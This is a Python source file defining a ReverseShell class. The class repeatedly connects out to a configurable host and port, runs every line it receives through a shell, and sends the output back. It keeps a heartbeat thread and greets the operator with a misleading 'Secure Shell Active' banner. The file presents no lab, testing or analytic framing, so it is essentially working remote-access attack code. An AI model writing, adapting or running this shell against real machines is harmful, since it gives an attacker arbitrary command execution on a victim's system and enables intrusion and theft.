import socket
import subprocess
import threading
import os
import sys
import time

class ReverseShell:
    def __init__(self, host="127.0.0.1", port=5050):
        self.host = host
        self.port = port
        self.connected = False
        self.status = "IDLE"
        self.sock = None
        self.thread = None
        self._stop_event = threading.Event()

    def _connect_and_shell(self):
        self.status = "CONNECTING..."
        while not self._stop_event.is_set():
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(5.0)
                self.sock.connect((self.host, self.port))
                self.sock.settimeout(None)
                self.connected = True
                self.status = "CONNECTED"
                
                # Send heartbeat in background
                heartbeat_thread = threading.Thread(target=self._heartbeat, daemon=True)
                heartbeat_thread.start()

                self.sock.send(b"[SYSTEM] Secure Shell Active. Waiting for instruction...\n")
                
                while self.connected and not self._stop_event.is_set():
                    data = self.sock.recv(1024).decode("utf-8").strip()
                    if not data: 
                        break
                    if data.lower() == "ping":
                        self.sock.send(b"pong\n")
                        continue
                    if data.lower() == "quit":
                        break
                    
                    try:
                        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout, stderr = proc.communicate()
                        output = stdout + stderr
                        if not output: output = b"[Done]\n"
                        self.sock.send(output)
                    except Exception as e:
                        self.sock.send(f"Exec Error: {str(e)}\n".encode("utf-8"))
            
            except Exception as e:
                self.status = f"RETRYING: {str(e)[:20]}..."
                time.sleep(2) # Wait before retry
            finally:
                self.connected = False
                if self.sock: self.sock.close()
                if self._stop_event.is_set(): break

    def _heartbeat(self):
        while self.connected:
            try:
                # Silent heartbeat to keep connection alive
                # In this simple proto, we don't send anything unless listener expects it
                # But we can verify socket is alive
                self.sock.send(b"") 
                time.sleep(10)
            except:
                self.connected = False
                break

    def start(self):
        if not self.thread or not self.thread.is_alive():
            self._stop_event.clear()
            self.thread = threading.Thread(target=self._connect_and_shell, daemon=True)
            self.thread.start()

    def stop(self):
        self._stop_event.set()
        self.connected = False
        if self.sock: self.sock.close()
